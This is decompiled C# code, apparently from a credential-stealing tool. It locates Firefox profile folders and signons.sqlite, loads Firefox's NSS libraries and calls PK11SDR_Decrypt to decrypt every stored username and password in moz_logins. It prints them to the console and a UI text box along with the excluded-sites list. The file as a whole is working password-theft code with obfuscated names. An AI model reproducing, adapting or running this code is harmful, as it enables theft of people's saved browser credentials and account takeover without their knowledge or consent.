using System;
using System.Collections;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic.CompilerServices;

internal sealed class Class5
{
	public struct Struct0
	{
		public int int_0;

		public int int_1;

		public int int_2;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate0(string string_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate1();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate2(IntPtr intptr_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate3(long long_0, bool bool_0, long long_1);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate4(ref Struct0 struct0_0, ref Struct0 struct0_1, int int_0);

	private IntPtr intptr_0;

	[DebuggerNonUserCode]
	public Class5()
	{
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_1, string string_0);

	public long method_0(string string_0)
	{
		string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		LoadLibrary(text + "mozcrt19.dll");
		LoadLibrary(text + "nspr4.dll");
		LoadLibrary(text + "plc4.dll");
		LoadLibrary(text + "plds4.dll");
		LoadLibrary(text + "ssutil3.dll");
		LoadLibrary(text + "sqlite3.dll");
		LoadLibrary(text + "nssutil3.dll");
		LoadLibrary(text + "softokn3.dll");
		intptr_0 = LoadLibrary(text + "nss3.dll");
		IntPtr procAddress = GetProcAddress(intptr_0, "NSS_Init");
		Delegate0 @delegate = (Delegate0)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate0));
		return @delegate(string_0);
	}

	public long method_1()
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "PK11_GetInternalKeySlot");
		Delegate1 @delegate = (Delegate1)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate1));
		return @delegate();
	}

	public long method_2(long long_0, bool bool_0, long long_1)
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "PK11_Authenticate");
		Delegate3 @delegate = (Delegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate3));
		return @delegate(long_0, bool_0, long_1);
	}

	public int method_3(IntPtr intptr_1, IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0)
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "NSSBase64_DecodeBuffer");
		Delegate2 @delegate = (Delegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate2));
		return @delegate(intptr_1, intptr_2, stringBuilder_0, int_0);
	}

	public int method_4(ref Struct0 struct0_0, ref Struct0 struct0_1, int int_0)
	{
		IntPtr procAddress = GetProcAddress(intptr_0, "PK11SDR_Decrypt");
		Delegate4 @delegate = (Delegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate4));
		return @delegate(ref struct0_0, ref struct0_1, int_0);
	}

	public object method_5()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		string text4 = default(string);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
					{
						ProjectData.ClearProjectError();
						num2 = 2;
						string text = string.Empty;
						bool flag = false;
						long num3 = 0L;
						_ = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
						string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
						string[] directories = Directory.GetDirectories(path);
						string[] array = directories;
						foreach (string text2 in array)
						{
							if (flag)
							{
								break;
							}
							string[] files = Directory.GetFiles(text2);
							string[] array2 = files;
							foreach (string text3 in array2)
							{
								if (flag)
								{
									break;
								}
								if (Regex.IsMatch(text3, "signons.sqlite"))
								{
									method_0(text2);
									text4 = text3;
								}
							}
						}
						string string_ = text4;
						Struct0 @struct = default(Struct0);
						Struct0 struct0_ = default(Struct0);
						Struct0 struct0_2 = default(Struct0);
						GClass1 gClass = new GClass1(string_);
						DataTable dataTable = gClass.method_4("SELECT * FROM moz_logins;");
						DataTable dataTable2 = gClass.method_4("SELECT * FROM moz_disabledHosts;");
						Console.WriteLine("=Excluded Websites=");
						IEnumerator enumerator = dataTable2.Rows.GetEnumerator();
						while (enumerator.MoveNext())
						{
							DataRow dataRow = (DataRow)enumerator.Current;
							Console.WriteLine(dataRow["hostname"].ToString());
						}
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
						Console.WriteLine();
						Console.WriteLine();
						num3 = method_1();
						method_2(num3, bool_0: true, 0L);
						Console.WriteLine("=Usernames and Passwords=");
						Console.WriteLine();
						IEnumerator enumerator2 = dataTable.Rows.GetEnumerator();
						while (enumerator2.MoveNext())
						{
							DataRow dataRow2 = (DataRow)enumerator2.Current;
							string text5 = Convert.ToString(dataRow2["formSubmitURL"].ToString());
							text = text + "-------------------------\r\nWebsite: " + text5 + "\r\n";
							Class1.smethod_3().method_0().vmethod_2()
								.set_Text(text);
							StringBuilder stringBuilder = new StringBuilder(dataRow2["encryptedUsername"].ToString());
							int value = method_3(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
							IntPtr ptr = new IntPtr(value);
							Struct0 struct0_3 = (Struct0)Marshal.PtrToStructure(ptr, typeof(Struct0));
							if (method_4(ref struct0_3, ref struct0_, 0) == 0 && struct0_.int_2 != 0)
							{
								byte[] array3 = new byte[struct0_.int_2 - 1 + 1];
								ptr = new IntPtr(struct0_.int_1);
								Marshal.Copy(ptr, array3, 0, struct0_.int_2);
								text = text + "Username: " + Encoding.ASCII.GetString(array3) + "\r\n";
							}
							StringBuilder stringBuilder2 = new StringBuilder(dataRow2["encryptedPassword"].ToString());
							int value2 = method_3(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
							ptr = new IntPtr(value2);
							Struct0 struct0_4 = (Struct0)Marshal.PtrToStructure(ptr, typeof(Struct0));
							if (method_4(ref struct0_4, ref struct0_2, 0) == 0 && struct0_2.int_2 != 0)
							{
								byte[] array3 = new byte[struct0_2.int_2 - 1 + 1];
								ptr = new IntPtr(struct0_2.int_1);
								Marshal.Copy(ptr, array3, 0, struct0_2.int_2);
								text = text + "Password: " + Encoding.ASCII.GetString(array3) + "\r\n-------------------------\r\n";
							}
						}
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
						break;
					}
					case 900:
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						default:
							goto IL_03bc;
						}
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 900;
				continue;
			}
			break;
			IL_03bc:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}
}
